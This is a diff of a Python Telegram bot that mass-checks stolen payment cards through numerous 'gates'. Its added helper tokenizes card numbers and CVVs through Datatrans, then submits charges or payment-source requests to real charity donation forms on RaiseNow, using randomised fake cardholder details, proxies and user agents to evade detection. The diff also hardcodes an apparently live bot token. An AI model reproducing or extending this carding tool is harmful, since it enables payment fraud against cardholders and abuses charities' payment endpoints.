@@ -25,36 +25,36 @@ from telegram.helpers import escape_markdown
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
 # --- MODIFIED: Renamed imports to avoid conflicts with new wrapper functions ---
-# from site_checker import site_command as original_site_command
-# from site_checker import sitem_command as original_sitem_command
+from site_checker import site_command as original_site_command
+from site_checker import sitem_command as original_sitem_command
 
 # --- NEW: IMPORT GATE CHECKERS FROM THE 'checkers' DIRECTORY ---
-# from checkers.gate3_checker import check_card_gate3
-# from checkers.gate4_checker import check_card_gate4
-# from checkers.gate5_checker import check_card_gate5
-# from checkers.gate6_checker import check_card_gate6
-# from checkers.gate7_checker import check_card_gate7
-# from checkers.gate8_checker import check_card_gate8
-# from checkers.gate9_checker import check_card_gate9
-# from checkers.gate10_checker import check_card_gate10
-# from checkers.gate11_checker import check_card_gate11
-# from checkers.gate12_checker import check_card_gate12
-# from checkers.gate13_checker import check_card_gate13
-# from checkers.gate14_checker import check_card_gate14
-# from checkers.gate15_checker import check_card_gate15
-# from checkers.gate16_checker import check_card_gate16
-# from checkers.gate17_checker import check_card_gate17
-# from checkers.gate18_checker import check_card_gate18
+from checkers.gate3_checker import check_card_gate3
+from checkers.gate4_checker import check_card_gate4
+from checkers.gate5_checker import check_card_gate5
+from checkers.gate6_checker import check_card_gate6
+from checkers.gate7_checker import check_card_gate7
+from checkers.gate8_checker import check_card_gate8
+from checkers.gate9_checker import check_card_gate9
+from checkers.gate10_checker import check_card_gate10
+from checkers.gate11_checker import check_card_gate11
+from checkers.gate12_checker import check_card_gate12
+from checkers.gate13_checker import check_card_gate13
+from checkers.gate14_checker import check_card_gate14
+from checkers.gate15_checker import check_card_gate15
+from checkers.gate16_checker import check_card_gate16
+from checkers.gate17_checker import check_card_gate17
+from checkers.gate18_checker import check_card_gate18
 # --- NEW: IMPORT MULTI-GATE CHECKER ---
-from multi_gate_checker import check_card_multi_gate, _perform_single_request
+from checkers.multi_gate_checker import check_card_multi_gate, get_banned_gates, unban_all_gates, _check_card_generic as check_card_multi_generic
 # --- MODIFIED: Import module to allow reloading ---
 import gate_configurations as gate_configs_module
 
 
 # --- CONFIGURATION ---
-BOT_TOKEN = "YOUR_BOT_TOKEN" #<-- THAY TOKEN CỦA BẠN VÀO ĐÂY
-ADMIN_ID = 5127429005 #<-- THAY ID ADMIN CỦA BẠN VÀO ĐÂY
-ADMIN_USERNAME = "@startsuttdow" #<-- THAY USERNAME ADMIN CỦA BẠN VÀO ĐÂY
+BOT_TOKEN = "8383293948:AAEDVbBV05dXWHNZXod3RRJjmwqc2N4xsjQ"
+ADMIN_ID = 5127429005
+ADMIN_USERNAME = "@startsuttdow"
 
 # --- STORAGE FILES & DIRECTORIES ---
 USER_FILE = "authorized_users.txt"
@@ -84,8 +84,6 @@ GATE17_MODE_FILE = "gate17_mode.json"
 GATE18_MODE_FILE = "gate18_mode.json"
 # --- NEW: FILE FOR MULTI-GATE MODE ---
 MULTI_GATE_MODE_FILE = "multi_gate_mode.json"
-# --- NEW: BANNED GATES FILE ---
-BANNED_GATES_FILE = "banned_gates.json"
 
 
 # --- DEFAULT LIMITS FOR MEMBERS ---
@@ -123,6 +121,8 @@ logger = logging.getLogger(__name__)
 # --- INITIALIZATION ---
 # Create log directory if it doesn't exist
 os.makedirs(LOG_DIR, exist_ok=True)
+# Create checkers directory if it doesn't exist
+os.makedirs("checkers", exist_ok=True)
 
 
 # --- USER, DATA & GATE MANAGEMENT ---
@@ -195,23 +195,6 @@ def set_multi_gate_mode(is_enabled, mode):
     if mode not in ['live', 'charge']:
         mode = 'live'
     save_json_file(MULTI_GATE_MODE_FILE, {'enabled': is_enabled, 'mode': mode})
-    # Reset banned gates when mode is changed
-    unban_all_gates()
-
-def get_banned_gates():
-    """Loads the list of currently banned gates."""
-    return load_json_file(BANNED_GATES_FILE, default_data=[])
-
-def ban_gate(gate_name):
-    """Adds a gate to the banned list."""
-    banned_gates = get_banned_gates()
-    if gate_name not in banned_gates:
-        banned_gates.append(gate_name)
-        save_json_file(BANNED_GATES_FILE, banned_gates)
-
-def unban_all_gates():
-    """Clears the banned gates list."""
-    save_json_file(BANNED_GATES_FILE, [])
 
 
 # --- GATE 1 MODE MANAGEMENT (NEW) ---
@@ -1283,28 +1266,43 @@ def check_card(line, cancellation_event=None, custom_charge_amount=None):
         
         # --- NEW: CHECK FOR MULTI-GATE MODE FIRST ---
         if is_multi_gate_mode():
-            # Lấy danh sách các gate chưa bị ban
-            banned_gates = get_banned_gates()
-            all_configured_gates = list(gate_configs_module.GATE_CONFIGS.keys())
-            available_gates = [g for g in all_configured_gates if g not in banned_gates]
-            
-            if not available_gates:
-                return 'all_gates_failed', line, 'All available gates are currently banned.', bin_info
-
-            retry_policy = {'retries': 10}
-            return check_card_multi_gate(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_multi_gate_mode, custom_charge_amount, available_gates, retry_policy)
-
+            return check_card_multi_gate(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_multi_gate_mode, custom_charge_amount)
 
         active_gate = get_active_gate()
         
         # --- CẬP NHẬT: Logic gate đã được thay đổi ---
         if active_gate == '3':
-            # return check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate3_mode, _get_charge_value, custom_charge_amount)
-            pass
+            return check_card_gate3(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate3_mode, _get_charge_value, custom_charge_amount)
         elif active_gate == '4':
-            # return check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)
-            pass
-        # ... (other single gate checks would go here if they were in separate files) ...
+            return check_card_gate4(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)
+        elif active_gate == '5':
+            return check_card_gate5(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate5_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '6':
+            return check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)
+        elif active_gate == '7':
+            return check_card_gate7(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount)
+        elif active_gate == '8':
+            return check_card_gate8(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate8_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '9':
+            return check_card_gate9(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate9_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '10':
+            return check_card_gate10(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate10_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '11':
+            return check_card_gate11(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate11_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '12':
+            return check_card_gate12(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate12_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '13':
+            return check_card_gate13(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate13_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '14':
+            return check_card_gate14(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate14_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '15':
+            return check_card_gate15(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate15_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '16':
+            return check_card_gate16(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate16_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '17':
+            return check_card_gate17(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate17_mode, _get_charge_value, custom_charge_amount)
+        elif active_gate == '18':
+            return check_card_gate18(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_gate18_mode, _get_charge_value, custom_charge_amount)
         else:
             # Fallback cho các gate vẫn còn trong file chính
             gate_functions = {
@@ -1316,8 +1314,8 @@ def check_card(line, cancellation_event=None, custom_charge_amount=None):
             if gate_func:
                 return gate_func(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, custom_charge_amount)
             else:
-                 # Mặc định về gate không xác định nếu không tìm thấy
-                 return 'error', line, f"Gate {active_gate} function not found.", bin_info
+                 # Mặc định về gate 6 bên ngoài nếu active_gate không hợp lệ
+                 return check_card_gate6(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, _get_charge_value, custom_charge_amount)
 
 
     except Exception as e:
@@ -1340,17 +1338,6 @@ def check_card_with_retry(line, cancellation_event=None, custom_charge_amount=No
 
         status, original_line, full_response, bin_info = check_card(line, cancellation_event, custom_charge_amount)
         
-        # --- NEW: Handle gate banning for multi-gate mode ---
-        if status == 'needs_ban':
-            gate_to_ban = full_response
-            ban_gate(gate_to_ban)
-            # This status is internal; we need to continue processing the card on other gates.
-            # The calling function (_multi_check_worker) will handle this by re-calling.
-            # For the purpose of this wrapper, we treat it as an error to be retried by the main loop.
-            logger.info(f"Gate '{gate_to_ban}' banned. Retrying card {original_line} on next available gate.")
-            # We call check_card again immediately to try the next available gate
-            continue
-
         # Only retry if proxy is enabled and there's a specific HTTP error
         is_http_error = (
             status == 'error' and 
@@ -1460,7 +1447,7 @@ async def get_help_text(user: User):
             "   - *Description:* Checks a list of cards from a `.txt` file.\n\n"
             "🔹 `/stop`\n"
             "   - *Description:* Stops your currently running /mass or /multi task.\n"
-            # f"{new_commands}\n" # Site checker commands commented out as per file structure
+            f"{new_commands}\n"
             f"💳 **/mass Limit:** `{user_mass_limit}` lines/file.\n"
             f"🌟 **Upgrade to Premium:** Contact {ADMIN_USERNAME} for unlimited checking."
         )
@@ -1809,7 +1796,6 @@ async def _process_single_check(update, context, line, custom_charge_amount=None
                 'invalid_format': ("📋 FORMAT ERROR", full_response),
                 'error': ("❗️ ERROR", full_response),
                 'unknown': ("❔ UNKNOWN", full_response),
-                'all_gates_failed': ("❗️ ALL GATES FAILED", full_response),
             }
 
             # Determine status text and simple response message
@@ -1876,7 +1862,7 @@ async def _process_single_check(update, context, line, custom_charge_amount=None
                     response_display_part = f"**💬 Response:**\n```json\n{safe_response}\n```"
                 else:
                     response_display_part = f"**💬 Response:** `Unknown`"
-            elif status in ['custom', 'invalid_format', 'error', 'all_gates_failed']:
+            elif status in ['custom', 'invalid_format', 'error']:
                 # For other errors, or for 'custom' in live mode, show the details
                 safe_response = str(response_message)[:1000]
                 response_display_part = f"**💬 Response:**\n```json\n{safe_response}\n```"
@@ -2017,9 +2003,6 @@ async def _multi_check_worker(update, context):
     status_message = await update.message.reply_text(f"⏳ Initializing... Preparing to check `{total_lines}` cards via **{gate_name}**.", reply_markup=reply_markup)
     start_time = time.time()
     
-    # Reset banned gates at the start of a new task
-    unban_all_gates()
-    
     cancel_event = threading.Event()
     stop_typing_event = asyncio.Event()
     typing_task = asyncio.create_task(_send_typing_periodically(context, update.effective_chat.id, stop_typing_event))
@@ -2033,7 +2016,7 @@ async def _multi_check_worker(update, context):
         }
         CANCELLATION_EVENTS[user.id] = cancel_event
 
-        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0, 'all_gates_failed': 0}
+        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
         results = {k: [] for k in counts.keys()}
         processed_count = 0
         last_update_time = time.time()
@@ -2057,15 +2040,6 @@ async def _multi_check_worker(update, context):
                         debug_info = f"🐞 DEBUG ALERT (/multi from user {user.id}):\nCard: {original_line}\nResponse: {str(full_response)[:3500]}"
                         coro = context.bot.send_message(chat_id=ADMIN_ID, text=debug_info)
                         asyncio.run_coroutine_threadsafe(coro, loop)
-                    
-                    if status == 'needs_ban':
-                        gate_to_ban = full_response
-                        ban_gate(gate_to_ban)
-                        logger.info(f"Gate '{gate_to_ban}' is now banned for this session.")
-                        # Resubmit the same card to try on the next available gates
-                        future_to_line[executor.submit(check_card_with_retry, original_line, cancel_event)] = original_line
-                        processed_count -= 1 # Decrement because this card is not finished
-                        continue
 
                     if had_persistent_error:
                         persistent_http_error_count += 1
@@ -2086,7 +2060,7 @@ async def _multi_check_worker(update, context):
                         continue
 
                     counts[status] = counts.get(status, 0) + 1
-                    status_icons = {'success': '✅', 'live_success': '✅', 'decline': '❌', 'custom': '🔒', 'invalid_format': '📋', 'error': '❗️', 'unknown': '❔', 'cancelled': '🛑', 'all_gates_failed': '❗️'}
+                    status_icons = {'success': '✅', 'live_success': '✅', 'decline': '❌', 'custom': '🔒', 'invalid_format': '📋', 'error': '❗️', 'unknown': '❔', 'cancelled': '🛑'}
                     
                     # --- MODIFIED: Create detailed bin string ---
                     brand = (bin_info.get('brand') or 'N/A').upper()
@@ -2168,7 +2142,7 @@ async def _multi_check_worker(update, context):
                     status_lines.extend([
                         f"✅ **Approved:** `{counts['live_success']}`",
                         f"❌ **Declined:** `{counts['decline']}`",
-                        f"🔒 **3D Secure:** `{counts['custom']}` | ❔ **Errors:** `{counts['error'] + counts['all_gates_failed']}`"
+                        f"🔒 **3D Secure:** `{counts['custom']}` | ❔ **Errors:** `{counts['error']}`"
                     ])
                     status_text = "\n".join(status_lines)
 
@@ -2246,7 +2220,7 @@ async def _multi_check_worker(update, context):
             f"❌ **Declined:** `{counts['decline']}`",
             f"🔒 **3D Secure:** `{counts['custom']}`",
             f"📋 **Invalid Format:** `{counts['invalid_format']}`",
-            f"❗️ **Errors:** `{counts['error'] + counts['all_gates_failed']}`\n",
+            f"❗️ **Errors:** `{counts['error']}`\n",
             f"-----------------------------------------"
         ])
 
@@ -2259,7 +2233,6 @@ async def _multi_check_worker(update, context):
         if results['invalid_format']: final_message.extend(("\n**📋 INVALID FORMAT:**", *results['invalid_format']))
         if results['error']: final_message.extend(("\n**❗️ ERRORS:**", *results['error']))
         if results['unknown']: final_message.extend(("\n**❔ UNKNOWN:**", *results['unknown']))
-        if results['all_gates_failed']: final_message.extend(("\n**❗️ ALL GATES FAILED:**", *results['all_gates_failed']))
 
         final_text = "\n".join(final_message)
         
@@ -2343,9 +2316,6 @@ async def _mass_check_worker(update, context):
     active_gate = get_active_gate()
     gate_name = get_formatted_gate_name(active_gate)
 
-    # Reset banned gates at the start of a new task
-    unban_all_gates()
-
     session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
     session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
     os.makedirs(session_dir, exist_ok=True)
@@ -2369,7 +2339,7 @@ async def _mass_check_worker(update, context):
         }
         CANCELLATION_EVENTS[user.id] = cancel_event
 
-        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0, 'all_gates_failed': 0}
+        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0}
         result_lists = {k: [] for k in counts.keys()}
         result_lists['error_debug'] = []
         processed_count = 0
@@ -2395,15 +2365,6 @@ async def _mass_check_worker(update, context):
                         if user.id != ADMIN_ID:
                             coro = context.bot.send_message(chat_id=ADMIN_ID, text=f"🐞 DEBUG ALERT (user {user.id}):\n{debug_info}")
                             asyncio.run_coroutine_threadsafe(coro, loop)
-                    
-                    if status == 'needs_ban':
-                        gate_to_ban = full_response
-                        ban_gate(gate_to_ban)
-                        logger.info(f"Gate '{gate_to_ban}' is now banned for this session.")
-                        # Resubmit the same card to try on the next available gates
-                        future_to_line[executor.submit(check_card_with_retry, original_line, cancel_event)] = original_line
-                        processed_count -= 1 # Decrement because this card is not finished
-                        continue
                 
                     if had_persistent_error:
                         persistent_http_error_count += 1
@@ -2507,7 +2468,7 @@ async def _mass_check_worker(update, context):
                         f"❌ **Declined:** `{counts['decline']}`",
                         f"🔒 **3D Secure:** `{counts['custom']}`",
                         f"📋 **Invalid Format:** `{counts['invalid_format']}`",
-                        f"❔ **Errors:** `{counts['error'] + counts['all_gates_failed']}`"
+                        f"❔ **Errors:** `{counts['error']}`"
                     ])
                     status_text = "\n".join(status_lines)
 
@@ -2581,7 +2542,7 @@ async def _mass_check_worker(update, context):
                 f"❌ **Declined:** `{counts['decline']}`",
                 f"🔒 **3D Secure:** `{counts['custom']}`",
                 f"📋 **Invalid Format:** `{counts['invalid_format']}`",
-                f"❔ **Errors:** `{counts['error'] + counts['all_gates_failed']}`",
+                f"❔ **Errors:** `{counts['error']}`",
                 f"🛑 **Cancelled:** `{counts['cancelled']}`\n",
                 f"**⏱️ Took:** `{duration:.2f}s`"
             ])
@@ -2597,7 +2558,7 @@ async def _mass_check_worker(update, context):
         file_map = {
             'success': 'charged.txt', 'live_success': 'approved.txt', 'decline': 'declined.txt',
             'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
-            'error': 'errors.txt', 'unknown': 'unknown.txt', 'all_gates_failed': 'all_gates_failed.txt'
+            'error': 'errors.txt', 'unknown': 'unknown.txt'
         }
         for status, filename in file_map.items():
             if result_lists[status]:
@@ -2690,6 +2651,236 @@ async def active_checks_command(update, context):
     await update.message.reply_text(message, reply_markup=reply_markup)
 
 
+def _perform_gate_check(gate_id: str, card_line: str):
+    """
+    Helper function to perform a detailed check on a specific gate for the /status command.
+    Returns: (overall_status, transaction_id_info, second_request_response)
+    """
+    cc, mes, ano, cvv = card_line.split('|')
+    ano_full = f"20{ano}"
+    session = requests.Session()
+
+    proxy_config = load_proxies()
+    if proxy_config.get("enabled") and proxy_config.get("proxies"):
+        try:
+            proxy_str = random.choice(proxy_config["proxies"])
+            proxy_dict = _format_proxy_for_requests(proxy_str)
+            if proxy_dict:
+                session.proxies = proxy_dict
+                logger.info(f"Status check for Gate {gate_id} using proxy.")
+        except IndexError:
+            logger.warning("Proxy enabled but list is empty for status check.")
+
+    user_agent = random_user_agent()
+    transaction_id = None
+    transaction_id_info = "Not attempted."
+    second_request_response = "Not attempted."
+    overall_status = "Unknown ❓"
+
+    # --- NEW: Random formId for gate 12 ---
+    random_form_part_12 = ''.join(random.choices(string.digits, k=12))
+    form_id_12 = f"2508080{random_form_part_12}"
+
+    gate_configs = {
+        '1': {'formId': "250806042656273071", 'merchantId': "3000022877"},
+        '2': {'formId': "250806055626003241", 'merchantId': "3000022877"},
+        '3': {'formId': "250807082606088731", 'merchantId': "3000022877"},
+        '4': {'formId': "250807155854598300", 'merchantId': "3000022877"},
+        '5': {'formId': "250807181638869139", 'merchantId': "3000022877"},
+        '6': {'formId': "250802205541759546", 'merchantId': "3000022877"},
+        '7': {'formId': "250802162822879268", 'merchantId': "3000022877"},
+        '8': {'formId': "250804202812044270", 'merchantId': "3000022877"},
+        '9': {'formId': "250805043713003023", 'merchantId': "3000022877"},
+        '10': {'formId': "250807190400178471", 'merchantId': "3000022877"},
+        '11': {'formId': "250808040558588645", 'merchantId': "3000022877"},
+        '12': {'formId': form_id_12, 'merchantId': "3000022877"},
+        '13': {'formId': "250809051441568497", 'merchantId': "3000022877"},
+        '14': {'formId': "250809060833969497", 'merchantId': "3000022877"},
+        '15': {'formId': "250809064524398808", 'merchantId': "3000022877"},
+        '16': {'formId': "250809151742149087", 'merchantId': "3000022877"},
+        '17': {'formId': "250809161612328944", 'merchantId': "3000022877"},
+        '18': {'formId': "250809171314228987", 'merchantId': "3000022877"}
+    }
+    
+    config = gate_configs.get(gate_id)
+    
+    if not config:
+        return "Unknown ❓", f"Gate {gate_id} not configured", "N/A"
+
+    # --- Step 1: Tokenize ---
+    try:
+        tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
+        tokenize_payload = {
+            "mode": "TOKENIZE", "formId": config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA",
+            "merchantId": config['merchantId'], "browserUserAgent": user_agent, "browserJavaEnabled": "false",
+            "browserLanguage": "en-US", "browserColorDepth": "24", "browserScreenHeight": "1152",
+            "browserScreenWidth": "2048", "browserTZ": "-420"
+        }
+        tokenize_headers = {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com", "X-Requested-With": "XMLHttpRequest", "User-Agent": user_agent}
+        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, max_retries=2)
+
+        if error: transaction_id_info = f"Error: {error}"
+        elif not token_response: transaction_id_info = "HTTP Error with no response"
+        else:
+            try:
+                token_data = token_response.json()
+                transaction_id = token_data.get("transactionId")
+                if transaction_id: transaction_id_info = transaction_id
+                else: transaction_id_info = f"Failed. Response: {token_response.text}"
+            except json.JSONDecodeError: transaction_id_info = f"Failed. Non-JSON response: {token_response.text}"
+    except Exception as e:
+        transaction_id_info = f"System Error: {e}"
+        return "Check Error 🔴", transaction_id_info, "Skipped due to Tokenization failure."
+
+    if not transaction_id:
+        return "Offline 🔴", transaction_id_info, "Skipped due to Tokenization failure."
+
+    # --- Step 2: Payment/Source Request ---
+    try:
+        random_first_name, random_last_name = generate_random_string(10), generate_random_string(12)
+        random_cardholder = f"{random_first_name} {random_last_name}"
+        payment_payload, payment_url = {}, ""
+        charge_value = 5000 if gate_id == '16' else (2000 if gate_id == '17' else 50)
+
+        if gate_id == '1':
+            mode = get_gate1_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "01bd7c99-eefc-42d2-91e4-4a020f6b5cfc", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": charge_value}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "email": random_email(), "birth_day": random_birth_day(), "birth_month": random_birth_month(), "birth_year": random_birth_year()}, "raisenow_parameters": {"analytics": {"channel": "paylink", "user_agent": user_agent}, "solution": {"uuid": "75405349-f0b9-4bed-9d28-df297347f272", "name": "Patenschaft Hundeabteilung", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/ynddy?lng=en", "uuid": "self-service", "version": "2.16.0"}}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "110885c2-a1e8-47b7-a2af-525ad6ab8ca6", "return_url": "https://donate.raisenow.io/ynddy?lng=en&rnw-view=payment_result", "subscription": {"recurring_interval": "6 * *", "timezone": "Asia/Bangkok"}}
+        elif gate_id == '2':
+            mode = get_gate2_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "14bd66de-7d3a-4d31-98cd-072193050b5f", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": charge_value}, "supporter": {"locale": "de", "first_name": random_first_name, "last_name": random_last_name}, "raisenow_parameters": {"analytics": {"channel": "paylink", "user_agent": user_agent}, "solution": {"uuid": "0a3ee5eb-f169-403a-b4b8-b8641fe2a07d", "name": "Ausbildung Assistenzhund für Christopher", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/bchqm?lng=de", "uuid": "self-service", "version": "2.16.0"}, "integration": {"donation_receipt_requested": "false"}}, "custom_parameters": {"campaign_id": "Ausbildung Assistenzhund für Christopher", "campaign_subid": ""}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "30b982d3-d984-4ed7-bd0d-c23197edfd1c", "return_url": "https://donate.raisenow.io/bchqm?lng=de&rnw-view=payment_result"}
+        elif gate_id == '3':
+            mode = get_gate3_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "6fe80dce-e221-487a-817e-5e93a1d2119a", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": charge_value}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "email": "yujmyujmyuk@gmail.com", "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}}, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[1000,2000,5000]", "user_agent": user_agent}, "solution": {"uuid": "834f9dcc-f4a1-4d56-8aa5-ab21a88d917f", "name": "Syrienhilfe (3476)", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/hvtkm?lng=en", "uuid": "self-service", "version": "2.16.0"}}, "custom_parameters": {"campaign_id": "", "campaign_subid": "", "rnw_recurring_interval_name": "monthly", "rnw_recurring_interval_text": "Monthly"}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes, "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "3b718a2e-be58-48ce-95f5-ff6471108a78", "return_url": "https://donate.raisenow.io/hvtkm?lng=en&rnw-view=payment_result", "subscription": {"recurring_interval": "7 * *", "timezone": "Asia/Bangkok"}}
+        elif gate_id == '4':
+            payment_url = "https://api.raisenow.io/payments"
+            payment_payload = json.loads(f'{{"account_uuid": "8a643026-d8e9-46b8-94dd-5bc94ff11a7c", "test_mode": false, "create_supporter": false, "amount": {{"currency": "CHF", "value": {charge_value}}}, "supporter": {{"locale": "en", "first_name": "{random_first_name}", "last_name": "{random_last_name}", "email": "jyttynhtrrthrthrt@gmail.com"}}, "raisenow_parameters": {{"analytics": {{"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,8000,10000]", "user_agent": "{user_agent}"}}, "solution": {{"uuid": "55d69f66-71d4-4240-b718-b200f804399b", "name": "Förderkreise", "type": "donate"}}, "product": {{"name": "tamaro", "source_url": "https://donate.raisenow.io/hwcqr?lng=en", "uuid": "self-service", "version": "2.16.0"}}, "integration": {{"donation_receipt_requested": "false"}}}}, "custom_parameters": {{"campaign_id": "", "campaign_subid": "", "rnw_recurring_interval_name": "yearly", "rnw_recurring_interval_text": "Yearly"}}, "payment_information": {{"brand_code": "eca", "cardholder": "{random_cardholder}", "expiry_month": "{mes}", "expiry_year": "{ano_full}", "transaction_id": "{transaction_id}"}}, "profile": "71c2b9d6-7259-4ac6-8087-e41b5a46c626", "return_url": "https://donate.raisenow.io/hwcqr?lng=en&rnw-view=payment_result", "subscription": {{"custom_parameters": {{"campaign_id": "", "campaign_subid": "", "rnw_recurring_interval_name": "yearly", "rnw_recurring_interval_text": "Yearly"}}, "raisenow_parameters": {{"analytics": {{"channel": "paylink", "preselected_amount": "5000", "suggested_amounts": "[5000,8000,10000]", "user_agent": "{user_agent}"}}, "solution": {{"uuid": "55d69f66-71d4-4240-b718-b200f804399b", "name": "Förderkreise", "type": "donate"}}, "product": {{"name": "tamaro", "source_url": "https://donate.raisenow.io/hwcqr?lng=en", "uuid": "self-service", "version": "2.16.0"}}, "integration": {{"donation_receipt_requested": "false"}}}}, "recurring_interval": "7 8 *", "timezone": "Asia/Bangkok"}}}}')
+        elif gate_id == '5':
+            from checkers.gate5_checker import COUNTRY_CODES
+            mode = get_gate5_mode()
+            payment_url = "https://api.raisenow.io/payments" if mode == 'charge' else "https://api.raisenow.io/payment-sources"
+            payment_payload = {"account_uuid": "5f13f598-6eae-40af-b197-0da4b84aa7f3", "test_mode": False, "create_supporter": False, "amount": {"currency": "EUR", "value": charge_value}, "supporter": {"locale": "en", "first_name": random_first_name, "last_name": random_last_name, "email": random_email(), "email_permission": False, "raisenow_parameters": {"integration": {"opt_in": {"email": False}}}, "country": random.choice(COUNTRY_CODES)}, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "1000", "suggested_amounts": "[1000,2000,5000]", "user_agent": user_agent}, "solution": {"uuid": "388f9be0-fb56-4e3a-a5f0-c676dc773df6", "name": "Godparent", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/tkgsf?lng=en", "uuid": "self-service", "version": "2.16.0"}}, "custom_parameters": {"campaign_id": "Website", "campaign_subid": "Godparent", "rnw_recurring_interval_name": "monthly", "rnw_recurring_interval_text": "Monthly"}, "payment_information": {"brand_code": "eca", "cardholder": random_cardholder, "expiry_month": mes.zfill(2), "expiry_year": ano_full, "transaction_id": transaction_id}, "profile": "e2bb1bce-d949-4987-8834-4a0770ee4f03", "return_url": "https://donate.raisenow.io/tkgsf?lng=en&rnw-view=payment_result", "subscription": {"custom_parameters": {"campaign_id": "Website", "campaign_subid": "Godparent", "rnw_recurring_interval_name": "monthly", "rnw_recurring_interval_text": "Monthly"}, "raisenow_parameters": {"analytics": {"channel": "paylink", "preselected_amount": "1000", "suggested_amounts": "[1000,2000,5000]", "user_agent": user_agent}, "solution": {"uuid": "388f9be0-fb56-4e3a-a5f0-c676dc773df6", "name": "Godparent", "type": "donate"}, "product": {"name": "tamaro", "source_url": "https://donate.raisenow.io/tkgsf?lng=en", "uuid": "self-service", "version": "2.16.0"}}, "recurring_interval": "7 * *", "timezone": "Asia/Bangkok"}}
+        elif gate_id == '6':
+            payment_url = "https://api.raisenow.io/payments"
